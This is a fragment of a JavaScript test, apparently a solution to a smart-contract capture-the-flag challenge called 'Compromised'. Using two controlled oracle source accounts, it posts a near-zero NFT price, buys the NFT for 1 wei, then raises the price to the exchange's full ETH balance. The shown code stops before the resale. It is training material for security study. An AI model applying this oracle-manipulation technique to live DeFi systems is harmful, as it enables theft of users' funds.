...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        await player.sendTransaction({
            to: await sources[0].getAddress(),
            value: ethers.utils.parseEther('0.01')
        })
        await player.sendTransaction({
            to: await sources[1].getAddress(),
            value: ethers.utils.parseEther('0.01')
        })

        await oracle.connect(sources[0]).postPrice('DVNFT', 0);
        await oracle.connect(sources[1]).postPrice('DVNFT', 0);

        await exchange.connect(player).buyOne({ value: 1 });

        await oracle.connect(sources[0]).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
        await oracle.connect(sources[1]).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
